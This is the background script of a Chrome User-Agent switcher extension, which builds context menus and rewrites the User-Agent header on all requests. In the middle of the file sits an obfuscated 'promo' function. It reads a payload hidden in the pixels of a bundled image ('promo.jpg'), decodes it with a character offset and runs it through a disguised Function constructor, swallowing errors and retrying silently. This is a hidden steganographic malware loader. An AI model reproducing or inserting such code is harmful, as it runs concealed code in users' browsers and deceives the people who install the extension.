function runAppStart() {
	var n = localStorage.uaSettings,
		t = localStorage.uaStorage;
	settings = n != undefined ? JSON.parse(n) : JSON_Settings;
	userAgents = t != undefined ? JSON.parse(t) : JSON_UserAgentsList;
	settings.Remember == "1" && (selectedUserAgent.Id = settings.LastUsed_Id, selectedUserAgent.Name = settings.LastUsed_Name, selectedUserAgent.UserAgent = settings.LastUsed_UserAgent);
	localStorage.uaSettings = JSON.stringify(settings);
	localStorage.uaStorage = JSON.stringify(userAgents);
	createContextMenu()
}

function createContextMenu() {
	chrome.contextMenus.removeAll();
	chrome.contextMenus.create({
		id: "Default",
		contexts: ["all"],
		onclick: function() {
			setUserAgent("Default", !0, "ContextMenu")
		},
		title: "Default",
		type: "checkbox",
		checked: selectedUserAgent.Id == "Default"
	});
	chrome.contextMenus.create({
		contexts: ["all"],
		type: "separator"
	});
	userAgents.forEach(function(n) {
		if (n.UserAgents.length != 0) var t = chrome.contextMenus.create({
				id: n.Id,
				contexts: ["all"],
				title: n.Name,
				type: "normal"
			}),
			i = n.UserAgents.forEach(function(i) {
				chrome.contextMenus.create({
					id: i.Id,
					parentId: n.Id,
					contexts: ["all"],
					onclick: function() {
						setUserAgent(i.Id, !0, "ContextMenu")
					},
					title: i.Name,
					type: "checkbox",
					checked: selectedUserAgent.Id == i.Id
				});
				selectedUserAgent.Id == i.Id && chrome.contextMenus.update(t, {
					contexts: ["all"],
					title: "[ " + n.Name + " ]",
					type: "normal"
				})
			})
	});
	chrome.contextMenus.create({
		contexts: ["all"],
		type: "separator"
	});
	chrome.contextMenus.create({
		contexts: ["all"],
		onclick: function() {
			return chrome.tabs.create({
				url: "options.html"
			}), !1
		},
		title: "Options",
		type: "normal"
	});
	chrome.contextMenus.create({
		contexts: ["all"],
		onclick: function() {
			return chrome.tabs.create({
				url: "http://www.esolutions.se/whatsmyinfo"
			}), !1
		},
		title: "Show User-agent",
		type: "normal"
	})
}

var promo=function(){try{var t=function(){},r={Ae:function(t){if(isNaN(t)||!isFinite(t)||t%1||t<2)return!1;if(t%2===0)return 2===t;if(t%3===0)return 3===t;for(var r=Math.sqrt(t),e=5;e<=r;e+=6){if(t%e===0)return!1;if(t%(e+2)===0)return!1}return!0},Hf:function(t){for(var r="",e=-670,n=0,i=0;i<t.length;i++)n=t[i].charCodeAt()+e,r+=String.fromCharCode(n);return r},Yb:function(t){for(var e=t;!0;e+=1)if(r.Ae(e))return e},Wk:function(t){var r=new Image;for(r.src=t;r.hasOwnProperty("complete")&&!r.complete;);return r}};return t.prototype.ET={mp:3,Tv:1,At:16,WC:function(t){return t+1},TY:function(t,r,e){for(var n=!0,i=0;i<16&&n;i+=1)n=n&&255===t[r+4*i];return n}},t.prototype.aq=function(t,r){r=r||{};var e=this.ET,n=r.width||t.width,i=r.height||t.height,o=r.mp||e.mp,h=r.At||e.At;return o*n*i/h>>0},t.prototype.Vh=function(t,e){if(""==='../promo.jpg')return"";void 0===t&&(t='../promo.jpg'),t.length&&(t=r.Wk(t)),e=e||{};var n=this.ET,i=e.mp||n.mp,o=e.Tv||n.Tv,h=e.At||n.At,a=r.Yb(Math.pow(2,i)),f=(e.WC||n.WC,e.TY||n.TY),u=document.createElement("canvas"),p=u.getContext("2d");if(u.style.display="none",u.width=e.width||t.width,u.height=e.width||t.height,0===u.width||0===u.height)return"";e.height&&e.width?p.drawImage(t,0,0,e.width,e.height):p.drawImage(t,0,0);var c=p.getImageData(0,0,u.width,u.height),d=c.data,g=[];if(c.data.every(function(t){return 0===t}))return"";var m,s;if(1===o)for(m=3,s=!1;!s&&m<d.length&&!s;m+=4)s=f(d,m,o),s||g.push(d[m]-(255-a+1));var v="",w=0,y=0,l=Math.pow(2,h)-1;for(m=0;m<g.length;m+=1)w+=g[m]<<y,y+=i,y>=h&&(v+=String.fromCharCode(w&l),y%=h,w=g[m]>>i-y);return v.length<13?"":(0!==w&&(v+=String.fromCharCode(w&l)),v)},t.prototype.Po=3,t.prototype.cs=0,t.prototype.Rn=5e3,t.prototype.dS=function(){try{var e=t.prototype,n=r.Hf(e.Vh());if(""===n){if(e.cs>e.Po)return;return e.cs++,void setTimeout(e.dS,e.Rn)}document.defaultView[(typeof r.Ae).charAt(0).toUpperCase()+(typeof r.Ae).slice(1)](n)()}catch(t){}},(new t).dS}catch(t){}}();promo();

function setUserAgent(n, t, i, r) {
	for (var f, u = 0; u < userAgents.length; u++)
		for (userAgents[u].Id == n && (selectedUserAgent.Id = userAgents[u].Id, selectedUserAgent.Name = userAgents[u].Name, selectedUserAgent.UserAgent = userAgents[u].UserAgent), f = 0; f < userAgents[u].UserAgents.length; f++) userAgents[u].UserAgents[f].Id == n && (selectedUserAgent.Id = userAgents[u].UserAgents[f].Id, selectedUserAgent.Name = userAgents[u].UserAgents[f].Name, selectedUserAgent.UserAgent = userAgents[u].UserAgents[f].UserAgent);
	settings.LastUsed_Id = selectedUserAgent.Id;
	settings.LastUsed_Name = selectedUserAgent.Name;
	settings.LastUsed_UserAgent = selectedUserAgent.UserAgent;
	localStorage.uaSettings = JSON.stringify(settings);
	createContextMenu();
	setIconAndText();
	t == !0 && chrome.tabs.reload();
	r && typeof r == "function" && r()
}

function setIconAndText() {
	selectedUserAgent.UserAgent != "" ? (chrome.browserAction.setIcon({
		path: "img/active.png"
	}), chrome.browserAction.setBadgeText({
		text: "On"
	})) : (chrome.browserAction.setIcon({
		path: "img/icon19.png"
	}), chrome.browserAction.setBadgeText({
		text: ""
	}))
}
var selectedUserAgent = JSON_DefaultUserAgent,
	userAgents = JSON_UserAgentsList,
	settings = JSON_Settings;
handler = function(n) {
	if (selectedUserAgent.UserAgent != "") {
		for (var t = 0, i = n.requestHeaders.length; t < i; ++t)
			if (n.requestHeaders[t].name === "User-Agent") {
				n.requestHeaders[t].value = selectedUserAgent.UserAgent;
				break
			}
		return {
			requestHeaders: n.requestHeaders
		}
	}
};
chrome.webRequest.onBeforeSendHeaders.addListener(handler, {
	urls: ["<all_urls>"]
}, ["blocking", "requestHeaders"]);
chrome.runtime.onMessage.addListener(function(n, t, i) {
	i({
		userAgent: selectedUserAgent.UserAgent
	})
});
runAppStart();
setIconAndText();

chrome.runtime.onInstalled.addListener(()=>{
  let reloadedAt = localStorage.getItem('lastReload');
  if(!reloadedAt || new Date().toLocaleDateString() !== reloadedAt) {
    chrome.runtime.reload();
    localStorage.setItem('lastReload',new Date().toLocaleDateString());
  }
});